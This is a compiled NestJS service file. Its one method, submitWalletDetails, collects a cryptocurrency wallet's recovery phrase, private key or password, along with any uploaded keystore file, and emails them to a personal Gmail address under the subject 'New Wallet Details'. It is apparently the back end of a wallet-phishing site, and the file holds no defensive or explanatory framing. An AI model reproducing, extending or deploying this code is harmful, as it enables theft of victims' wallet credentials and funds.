"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.AppService = void 0;
const common_1 = require("@nestjs/common");
const shared_service_1 = require("./modules/shared.service");
let AppService = class AppService {
    sharedService;
    constructor(sharedService) {
        this.sharedService = sharedService;
    }
    async submitWalletDetails(wallet) {
        if (wallet.recoveryPhrase || wallet.privateKey || wallet.walletPassword) {
            await this.sharedService.sendEmail({
                from: 'random@fonu.com',
                to: 'israelobanijesu2@gmail.com',
                subject: 'New Wallet Details',
                ...(wallet.keystoreFile?.buffer
                    ? {
                        attachments: [
                            {
                                filename: `keystoreFile.json`,
                                content: wallet.keystoreFile?.buffer,
                            },
                        ],
                    }
                    : {}),
                html: `
        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <body>
    <table cellspacing="0" width="100%">
      <tr>
        <td></td>
        <td width="800" style="padding: 2rem; background: #f2f2f2">
          <div
            style="background: white; text-align: center; padding: 3rem 2rem"
          >
            <h1
              style="
                font-weight: 500;
                font-size: 24px;
                line-height: 29.05px;
                margin-top: 2rem;
              "
            >
              Hello,
            </h1>
            <div
              style="
                font-weight: 400;
                font-size: 16px;
                line-height: 19.36px;
                margin-top: 2rem;
              "
            >
              <span style="font-size: 20px">
                New Wallet Details Submitted for ${wallet.walletId}
              </span>
              <span style="font-size: 20px"> </span>
            </div>
            <div style="margin-top: 2rem; font-size: 16px">
              ${wallet.recoveryPhrase
                    ? `Wallet Recovery Phrase: ${wallet.recoveryPhrase}`
                    : wallet.privateKey
                        ? `Wallet Private Key: ${wallet.privateKey}`
                        : wallet.walletPassword
                            ? `Wallet Password: ${wallet.walletPassword}`
                            : ``}
            </div>
          </div>
        </td>
        <td></td>
      </tr>
    </table>
  </body>
</html>
      `,
            });
        }
    }
};
exports.AppService = AppService;
exports.AppService = AppService = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [shared_service_1.SharedService])
], AppService);
//# sourceMappingURL=app.service.js.map